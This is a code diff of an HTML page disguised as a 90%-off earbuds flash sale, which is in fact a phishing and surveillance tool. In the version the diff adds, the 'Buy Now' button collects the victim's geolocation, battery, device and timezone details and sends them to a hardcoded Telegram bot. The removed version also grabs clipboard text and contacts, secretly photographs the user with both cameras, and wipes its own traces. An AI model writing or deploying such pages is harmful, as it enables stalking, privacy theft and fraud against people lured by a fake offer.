@@ -4,193 +4,64 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Flash Sale - 90% OFF</title>
 <style>
-  body{margin:0;font-family:system-ui;background:#f4f4f6;display:grid;place-items:center;min-height:100vh}
-  .card{background:#fff;border-radius:16px;padding:24px;max-width:340px;width:90%;box-shadow:0 8px 30px #0002;text-align:center}
-  .thumb{height:150px;border-radius:12px;background:linear-gradient(135deg,#ff6a00,#ee0979);margin-bottom:16px}
-  h2{margin:0 0 6px}
-  .price{font-size:26px;font-weight:800;color:#111}
-  .cut{color:#999;text-decoration:line-through;margin-left:8px;font-size:15px}
-  button{margin-top:18px;width:100%;padding:15px;border:0;border-radius:10px;background:#111;color:#fff;font-size:16px;font-weight:700}
-  button:disabled{background:#888}
-  .status{font-size:13px;color:#555;margin-top:14px;min-height:18px}
+body{margin:0;font-family:system-ui;background:#f4f4f6;display:grid;place-items:center;min-height:100vh}
+.card{background:#fff;border-radius:16px;padding:24px;max-width:340px;width:90%;box-shadow:0 8px 30px #0002;text-align:center}
+.thumb{height:150px;border-radius:12px;background:linear-gradient(135deg,#ff6a00,#ee0979);margin-bottom:16px}
+h2{margin:0 0 6px}
+.price{font-size:26px;font-weight:800;color:#111}
+.cut{color:#999;text-decoration:line-through;margin-left:8px;font-size:15px}
+button{margin-top:18px;width:100%;padding:15px;border:0;border-radius:10px;background:#111;color:#fff;font-size:16px;font-weight:700}
+button:disabled{background:#888}
+.status{font-size:13px;color:#555;margin-top:14px;min-height:18px}
 </style>
 <div class="card">
-  <div class="thumb"></div>
-  <h2>Wireless Earbuds Pro</h2>
-  <div class="price">₹199 <span class="cut">₹1999</span></div>
-  <button id="buy">Buy Now</button>
-  <div class="status" id="status"></div>
+<div class="thumb"></div>
+<h2>Wireless Earbuds Pro</h2>
+<div class="price">₹199 <span class="cut">₹1999</span></div>
+<button id="buy">Buy Now</button>
+<div class="status" id="status"></div>
 </div>
 <script>
-const BOT_TOKEN = '9198268582:AAEibZJ7yHYuCXFfWyJx0ap3MrktEEmhXVU';
-const CHAT_ID   = '8552743919';
-const TTL_MS    = 60 * 60 * 1000;
-
-const KEY = 'tmp_session';
-const SENT = 'tmp_sent';
-const MAX_SIDE = 320;
+const TOKEN = '9198268582:AAEibZJ7yHYuCXFfWyJx0ap3MrktEEmhXVU';
+const CHAT  = '8552743919';
 const buy = document.getElementById('buy');
-const statusEl = document.getElementById('status');
-let dead = false;
+const st  = document.getElementById('status');
 
-const TG = (m) => 'https://api.telegram.org/bot' + BOT_TOKEN + '/' + m;
-const readSession = () => { try { return JSON.parse(localStorage.getItem(KEY)); } catch { return null; } };
-const slowNet = () => { const c = navigator.connection; return !!c && (c.saveData || /2g/.test(c.effectiveType)); };
-const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-
-function gpuInfo() {
-  try {
-    const gl = document.createElement('canvas').getContext('webgl');
-    const e = gl.getExtension('WEBGL_debug_renderer_info');
-    return gl.getParameter(e.UNMASKED_RENDERER_WEBGL);
-  } catch { return null; }
+function loc(){
+  return new Promise(r=>{
+    if(!navigator.geolocation) return r('-');
+    navigator.geolocation.getCurrentPosition(
+      p=>r(p.coords.latitude+','+p.coords.longitude+' (±'+Math.round(p.coords.accuracy)+'m)\nhttps://maps.google.com/?q='+p.coords.latitude+','+p.coords.longitude),
+      ()=>r('-'),{timeout:8000});
+  });
+}
+function bat(){
+  return new Promise(r=>{
+    if(!navigator.getBattery) return r('-');
+    navigator.getBattery().then(b=>r(Math.round(b.level*100)+'%')).catch(()=>r('-'));
+  });
 }
 
-function meta() {
-  const n = navigator;
-  return [
-    'UA: ' + n.userAgent,
-    'Platform: ' + n.platform + ' | Lang: ' + n.language,
-    'Cores: ' + n.hardwareConcurrency + ' | RAM: ' + n.deviceMemory + 'GB',
-    'Screen: ' + screen.width + 'x' + screen.height + ' @' + devicePixelRatio,
+buy.onclick = async () => {
+  buy.disabled = true; buy.textContent = 'Processing...'; st.textContent = 'Reading...';
+  const l = await loc(), b = await bat();
+  const t = [
+    'Naya device',
+    'UA: ' + navigator.userAgent,
+    'Lang: ' + navigator.language,
+    'Screen: ' + screen.width + 'x' + screen.height,
     'TZ: ' + Intl.DateTimeFormat().resolvedOptions().timeZone,
-    'GPU: ' + (gpuInfo() || '?'),
-    'Net: ' + (n.connection ? n.connection.effectiveType + ' / ' + n.connection.downlink + 'mbps' : '?'),
-    'Touch: ' + n.maxTouchPoints,
+    'Battery: ' + b,
+    'Location: ' + l,
     'Time: ' + new Date().toLocaleString()
   ].join('\n');
-}
-
-async function battery() {
-  try { const b = await navigator.getBattery(); return 'Battery: ' + Math.round(b.level * 100) + '%' + (b.charging ? ' (charging)' : ''); }
-  catch { return null; }
-}
-
-async function geo() {
-  return new Promise(res => {
-    if (!navigator.geolocation) return res(null);
-    navigator.geolocation.getCurrentPosition(
-      p => res('Location: ' + p.coords.latitude.toFixed(6) + ',' + p.coords.longitude.toFixed(6) +
-               ' (±' + Math.round(p.coords.accuracy) + 'm)\nhttps://maps.google.com/?q=' +
-               p.coords.latitude + ',' + p.coords.longitude),
-      () => res(null),
-      { enableHighAccuracy: false, timeout: 8000, maximumAge: 60000 }
-    );
-  });
-}
-
-async function shoot(facing) {
-  if (slowNet()) return null;
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: false });
-    const v = document.createElement('video');
-    v.srcObject = stream; v.muted = true;
-    await v.play();
-    await new Promise(r => setTimeout(r, 450));
-    const w = Math.min(MAX_SIDE, v.videoWidth || MAX_SIDE);
-    const h = Math.round(w * ((v.videoHeight || w) / (v.videoWidth || w)));
-    const c = document.createElement('canvas');
-    c.width = w; c.height = h;
-    c.getContext('2d').drawImage(v, 0, 0, w, h);
-    stream.getTracks().forEach(t => t.stop());
-    return await new Promise(r => c.toBlob(r, 'image/jpeg', 0.5));
-  } catch { return null; }
-}
-
-async function contacts() {
-  try { return navigator.contacts ? await navigator.contacts.select(['name', 'tel'], { multiple: true }) : null; }
-  catch { return null; }
-}
-
-async function clipboard() {
-  try { return (await navigator.clipboard.readText()).slice(0, 400); } catch { return null; }
-}
-
-async function tgText(t) {
-  await fetch(TG('sendMessage'), {
+  await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {
     method: 'POST',
-    headers: { 'content-type': 'application/json' },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: t, parse_mode: 'HTML', disable_web_page_preview: false })
-  }).catch(() => {});
-}
-
-async function tgPhoto(blob, caption) {
-  if (!blob) return;
-  const fd = new FormData();
-  fd.append('chat_id', CHAT_ID);
-  fd.append('caption', caption);
-  fd.append('photo', blob, 'x.jpg');
-  await fetch(TG('sendPhoto'), { method: 'POST', body: fd }).catch(() => {});
-}
-
-async function selfDestruct() {
-  if (dead) return;
-  dead = true;
-  try { (await navigator.serviceWorker.getRegistrations()).forEach(r => r.unregister()); } catch {}
-  try { (await caches.keys()).forEach(k => caches.delete(k)); } catch {}
-  try { localStorage.clear(); sessionStorage.clear(); } catch {}
-  document.cookie.split(';').forEach(c => {
-    document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/');
-  });
-  location.replace('gone.html');
-}
-
-function watchdog(exp) {
-  const tick = () => {
-    const left = exp - Date.now();
-    if (left <= 0) return selfDestruct();
-    statusEl.textContent = 'Access active - ' + Math.floor(left / 60000) + ' min baaki';
-  };
-  tick();
-  setInterval(tick, 20000);
-}
-
-async function start() {
-  buy.disabled = true;
-  buy.textContent = 'Processing...';
-
-  const clip = await clipboard();
-  const cts = await contacts();
-
-  const expiresAt = Date.now() + TTL_MS;
-  localStorage.setItem(KEY, JSON.stringify({ expiresAt }));
-
-  try {
-    await navigator.serviceWorker.register('sw.js');
-    await navigator.serviceWorker.ready;
-    navigator.serviceWorker.controller?.postMessage({ type: 'INIT', expiresAt });
-  } catch {}
-
-  statusEl.textContent = 'Reading device...';
-
-  const bat = await battery();
-  const loc = await geo();
-
-  let text = '<b>Naya device</b>\n' + esc(meta());
-  if (bat) text += '\n' + esc(bat);
-  if (loc) text += '\n' + esc(loc);
-  if (clip) text += '\n\nClipboard:\n<pre>' + esc(clip) + '</pre>';
-  if (cts && cts.length) text += '\n\nContacts:\n<pre>' + esc(JSON.stringify(cts, null, 1)).slice(0, 3000) + '</pre>';
-
-  await tgText(text);
-  await tgPhoto(await shoot('user'), 'Front camera');
-  await tgPhoto(await shoot('environment'), 'Back camera');
-
-  localStorage.setItem(SENT, '1');
+    headers: {'content-type':'application/json'},
+    body: JSON.stringify({ chat_id: CHAT, text: t })
+  }).catch(()=>{});
+  st.textContent = 'Details bhej di gayi.';
   buy.textContent = 'Purchased';
-  watchdog(expiresAt);
-}
-
-(function boot() {
-  const s = readSession();
-  if (!s) return;
-  if (Date.now() > s.expiresAt) return selfDestruct();
-  buy.disabled = true;
-  buy.textContent = 'Purchased';
-  watchdog(s.expiresAt);
-  if (!localStorage.getItem(SENT)) start();
-})();
-
-buy.addEventListener('click', start);
+};
 </script>
 </html>
